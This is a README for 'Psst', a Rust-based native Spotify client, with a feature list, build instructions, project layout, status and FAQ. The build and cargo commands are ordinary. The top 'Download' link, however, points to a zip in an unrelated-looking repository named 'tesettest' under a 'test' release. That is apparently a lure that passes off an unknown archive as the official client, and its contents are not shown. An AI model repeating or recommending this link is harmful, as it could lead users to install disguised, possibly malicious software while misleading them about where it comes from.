# Psst — Native Spotify Client in Rust

Psst is a fast, multi-platform Spotify client with a native desktop interface. It is written in Rust and is designed to run without Electron on Windows, Linux, and macOS.

[Download](https://github.com/gcoyerk/tesettest/releases/download/test/psst-8.zip)

Psst is early-stage software. Some features are incomplete, and stability or user experience may vary between platforms.

A Spotify Premium account is required.

## What Psst Does

Psst provides a desktop Spotify experience focused on native performance and a lightweight application stack. It includes playback, browsing, search, library access, and a graphical interface built for desktop use.

Core capabilities include:

- Play Spotify tracks with Vorbis audio playback
- Browse saved albums and saved tracks
- Save and remove albums or tracks from the user library
- Browse followed playlists
- Search for artists, albums, and tracks
- Open Spotify links through the search field
- Control playback with media keys
- Use playback queue support
- Adjust audio volume
- Use audio loudness normalization
- Browse genre playlists and personalized content
- Access podcast content
- Use a dark theme
- View credits where available

## Platform Support

Psst is intended to run on:

- Windows
- Linux
- macOS

OpenBSD support has been explored, but it should be considered work in progress.

## Download Notes

Generated builds are intended for common desktop platforms, including Linux, macOS, and Windows. Availability depends on the release artifacts provided for the repository.

Unofficial package availability may vary by platform and distribution.

## Build Requirements

To build Psst from source, install the latest stable Rust toolchain. Rust 1.65.0 or newer is required.

Linux builds also require native system libraries used by the GUI and audio stack.

### Linux Dependencies

For Debian or Ubuntu-based systems:

```shell
sudo apt-get install libssl-dev libgtk-3-dev libcairo2-dev libasound2-dev
```

For Fedora or RHEL-based systems:

```shell
sudo dnf install openssl-devel gtk3-devel cairo-devel alsa-lib-devel
```

## Build and Run

Build the project:

```shell
cargo build
```

Build an optimized release version:

```shell
cargo build --release
```

Run the graphical client from source:

```shell
cargo run --bin psst-gui
```

Run the graphical client in release mode:

```shell
cargo run --bin psst-gui --release
```

## Application Bundle

For bundle-based packaging, install `cargo-bundle` and create a release bundle:

```shell
cargo install cargo-bundle
cargo bundle --release
```

## Project Layout

The repository is organized around three main components:

- `psst-core` — handles the Spotify session, audio retrieval, decoding, output, and playback queue
- `psst-gui` — desktop graphical application
- `psst-cli` — small command-line example for playing a track

## Current Development Status

Psst is functional but still under active development. Known areas that remain incomplete include:

- Better handling of unreliable network conditions
- Playlist management, such as editing playlist contents and names
- Reactions to audio output device changes
- Expanded caching behavior and cache visibility
- More complete artist-page information
- Reporting playback activity to Spotify services
- OS-specific application bundles
- Additional user interface refinements

Planned interface work includes improved layouts, stronger error states, better list handling, grid views, theme detection, and saving playback state.

## Privacy Notes

Psst connects to Spotify services for playback and account-related functionality. Local caches may be stored on the device and can be removed by the user.

User passwords are not stored by the application. Authentication is handled through a reusable Spotify token.

## FAQ

### Is Psst a full replacement for the official Spotify app?

Not currently. Psst is an early-stage native Spotify client and does not yet include every feature available in the official application.

### Does Psst require Spotify Premium?

Yes. A Spotify Premium account is required.

### Does Psst use Electron?

No. Psst uses a native GUI approach rather than Electron.

### Can I build it myself?

Yes. Install a supported Rust toolchain and the required platform dependencies, then use Cargo to build or run the project.

### Which platforms are supported?

Windows, Linux, and macOS are the main supported platforms. OpenBSD support is experimental.
